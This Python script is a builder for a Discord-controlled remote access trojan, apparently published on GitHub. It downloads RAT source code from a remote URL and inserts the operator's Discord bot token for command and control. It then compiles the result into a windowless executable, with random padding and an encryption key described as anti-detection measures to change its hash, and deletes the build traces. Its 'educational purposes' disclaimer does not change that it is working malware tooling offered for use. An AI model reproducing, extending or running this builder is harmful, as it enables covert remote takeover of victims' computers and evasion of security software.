import hashlib
import os
import random
import shutil
import subprocess
import sys
from colorama import init, Fore, Style

# Initialize colorama
init()

def print_banner():
    """Print the application banner."""
    banner = f"""
    {Fore.RED}╔═══════════════════════════════════════════════════════════════════════╗
    ║ {Fore.CYAN}███████╗██╗  ██╗ ██████╗ ████████╗██╗ ██████╗ █████╗ ██╗     ██╗  ██╗{Fore.RED} ║
    ║ {Fore.CYAN}██╔════╝╚██╗██╔╝██╔═══██╗╚══██╔══╝██║██╔════╝██╔══██╗██║     ╚██╗██╔╝{Fore.RED} ║
    ║ {Fore.CYAN}█████╗   ╚███╔╝ ██║   ██║   ██║   ██║██║     ███████║██║      ╚███╔╝{Fore.RED} ║
    ║ {Fore.CYAN}██╔══╝   ██╔██╗ ██║   ██║   ██║   ██║██║     ██╔══██║██║      ██╔██╗{Fore.RED} ║
    ║ {Fore.CYAN}███████╗██╔╝ ██╗╚██████╔╝   ██║   ██║╚██████╗██║  ██║███████╗██╔╝ ██╗{Fore.RED} ║
    ║ {Fore.CYAN}╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{Fore.RED} ║
    ║                                                                           ║
    ║ {Fore.GREEN}Exotically Flexing RAT Builder{Fore.RED} ║
    ║ {Fore.YELLOW}Created by: dead exotic & hoa{Fore.RED} ║
    ║ {Fore.CYAN}https://github.com/deadexotic{Fore.RED} ║
    ╚═══════════════════════════════════════════════════════════════════════╝
    """
    print(banner)

def check_requirements():
    """Check and install required modules if needed."""
    required_modules = ['discord.py', 'pycaw', 'comtypes', 'requests', 'pyinstaller', 'colorama']
    missing_modules = []
    
    for module in required_modules:
        try:
            if module == 'discord.py':
                __import__('discord')
            else:
                __import__(module.split('.', maxsplit=1)[0])
        except ImportError:
            missing_modules.append(module)
    
    if missing_modules:
        print(f"{Fore.RED}[!] Missing required modules: {', '.join(missing_modules)}")
        install = input(f"{Fore.YELLOW}[?] Do you want to install them now? (y/n): {Style.RESET_ALL}")
        if install.lower() == 'y':
            for module in missing_modules:
                print(f"{Fore.CYAN}[*] Installing {module}...{Style.RESET_ALL}")
                subprocess.run([sys.executable, "-m", "pip", "install", module], check=False)
            print(f"{Fore.GREEN}[+] All required modules installed successfully!{Style.RESET_ALL}")
            return True
        print(f"{Fore.RED}[!] Please install the required modules and try again.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
        return False
    return True

def download_rat_source():
    """Download the RAT source code from GitHub."""
    url = "https://raw.githubusercontent.com/deadexotic/stuff-for-exotically-flexing/refs/heads/main/aaaaaaaaaaaaaaaaaaaaaaaaaaaaa.aaaaaaaaaaaaaaaaaaaaa"
    try:
        print(f"{Fore.CYAN}[*] Downloading RAT source code...{Style.RESET_ALL}")
        response = requests.get(url)
        if response.status_code == 200:
            with open("rat_source.py", "w", encoding="utf-8") as f:
                f.write(response.text)
            print(f"{Fore.GREEN}[+] RAT source code downloaded successfully!{Style.RESET_ALL}")
            return True
        print(f"{Fore.RED}[!] Failed to download RAT source code. Status code: {response.status_code}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Using main1.py as fallback...{Style.RESET_ALL}")
        try:
            shutil.copy("main1.py", "rat_source.py")
            print(f"{Fore.GREEN}[+] Using main1.py as RAT source code!{Style.RESET_ALL}")
            return True
        except Exception as e:
            print(f"{Fore.RED}[!] Error using main1.py as fallback: {str(e)}{Style.RESET_ALL}")
            return False
    except Exception as e:
        print(f"{Fore.RED}[!] Error downloading RAT source code: {str(e)}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Using main1.py as fallback...{Style.RESET_ALL}")
        try:
            shutil.copy("main1.py", "rat_source.py")
            print(f"{Fore.GREEN}[+] Using main1.py as RAT source code!{Style.RESET_ALL}")
            return True
        except Exception as e2:
            print(f"{Fore.RED}[!] Error using main1.py as fallback: {str(e2)}{Style.RESET_ALL}")
            return False

def insert_token(token):
    """Insert the Discord bot token into the RAT source code."""
    try:
        with open("rat_source.py", "r", encoding="utf-8") as f:
            lines = f.readlines()
        
        # Find the appropriate line to insert the token
        token_line_index = -1
        for i, line in enumerate(lines):
            if "token = " in line or "TOKEN = " in line:
                token_line_index = i
                break
        
        # If token line found, replace it; otherwise insert at line 18
        if token_line_index != -1:
            lines[token_line_index] = f"token = '{token}'\n"
        elif len(lines) >= 18:
            lines.insert(18, f"token = '{token}'\n")
        else:
            # If file is too short, append to the end
            lines.append(f"token = '{token}'\n")
            
        with open("rat_source.py", "w", encoding="utf-8") as f:
            f.writelines(lines)
        
        print(f"{Fore.GREEN}[+] Token inserted successfully!{Style.RESET_ALL}")
        return True
    except Exception as e:
        print(f"{Fore.RED}[!] Error inserting token: {str(e)}{Style.RESET_ALL}")
        return False

def compile_rat(output_name):
    """Compile the RAT source code into an executable."""
    try:
        print(f"{Fore.CYAN}[*] Compiling RAT...{Style.RESET_ALL}")
        
        # Check if rat_source.py exists
        if not os.path.exists("rat_source.py"):
            print(f"{Fore.RED}[!] rat_source.py not found. Cannot compile.{Style.RESET_ALL}")
            return False
        
        # Add random data to the executable to change hash
        with open("random_data.txt", "w", encoding="utf-8") as f:
            f.write(''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') 
                           for _ in range(random.randint(1000, 10000))))
        
        # PyInstaller command with anti-detection options
        cmd = [
            "pyinstaller",
            "--onefile",
            "--noconsole",
            "--clean",
            "--key", hashlib.sha256(os.urandom(32)).hexdigest()[:16],  # Encryption key
            "--add-data", f"random_data.txt{os.pathsep}.",
            "--name", output_name,
            "rat_source.py"
        ]
        
        # Run PyInstaller
        process = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=False)
        
        if process.returncode != 0:
            print(f"{Fore.RED}[!] Compilation failed: {process.stderr.decode()}{Style.RESET_ALL}")
            return False
        
        # Check if the executable was created
        exe_path = os.path.join("dist", f"{output_name}.exe")
        if os.path.exists(exe_path):
            # Copy to current directory
            shutil.copy(exe_path, f"{output_name}.exe")
            print(f"{Fore.GREEN}[+] RAT compiled successfully! Output: {output_name}.exe{Style.RESET_ALL}")
            
            # Clean up
            try:
                shutil.rmtree("build", ignore_errors=True)
                shutil.rmtree("dist", ignore_errors=True)
                if os.path.exists(f"{output_name}.spec"):
                    os.remove(f"{output_name}.spec")
                if os.path.exists("random_data.txt"):
                    os.remove("random_data.txt")
                if os.path.exists("rat_source.py"):
                    os.remove("rat_source.py")
            except Exception as e:
                print(f"{Fore.YELLOW}[!] Warning: Could not clean up some files: {str(e)}{Style.RESET_ALL}")
            
            return True
        
        print(f"{Fore.RED}[!] Compilation completed but executable not found.{Style.RESET_ALL}")
        return False
            
    except Exception as e:
        print(f"{Fore.RED}[!] Error compiling RAT: {str(e)}{Style.RESET_ALL}")
        return False

def main():
    """Main function to run the RAT builder."""
    print_banner()
    
    print(f"{Fore.CYAN}[*] Checking requirements...{Style.RESET_ALL}")
    if not check_requirements():
        return
    
    print(f"\n{Fore.YELLOW}[!] DISCLAIMER: This tool is for educational purposes only.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] The authors are not responsible for any misuse or damage caused by this program.{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[!] By continuing, you agree that you will use this responsibly and legally.{Style.RESET_ALL}\n")
    
    agree = input(f"{Fore.YELLOW}[?] Do you agree? (y/n): {Style.RESET_ALL}")
    if agree.lower() != 'y':
        print(f"{Fore.RED}[!] Exiting...{Style.RESET_ALL}")
        return
    
    # Get Discord bot token
    token = input(f"{Fore.YELLOW}[?] Enter your Discord bot token: {Style.RESET_ALL}")
    if not token:
        print(f"{Fore.RED}[!] Token cannot be empty.{Style.RESET_ALL}")
        return
    
    # Download RAT source
    if not download_rat_source():
        print(f"{Fore.YELLOW}[i] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
        return
    
    # Insert token
    if not insert_token(token):
        print(f"{Fore.YELLOW}[i] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
        return
    
    # Get output name
    output_name = input(f"{Fore.YELLOW}[?] Enter output file name (default: ExoticallyFlexing): {Style.RESET_ALL}")
    if not output_name:
        output_name = "ExoticallyFlexing"
    
    # Compile RAT
    if not compile_rat(output_name):
        print(f"{Fore.YELLOW}[i] For help, contact hoaofficial on Discord or simwiping on Telegram.{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.GREEN}[+] Build completed successfully!{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Your RAT is ready: {output_name}.exe{Style.RESET_ALL}")
    print(f"\n{Fore.CYAN}[i] Thanks for using Exotically Flexing RAT Builder!{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[i] Created by dead exotic & hoa{Style.RESET_ALL}")
    print(f"{Fore.CYAN}[i] GitHub: https://github.com/deadexotic{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
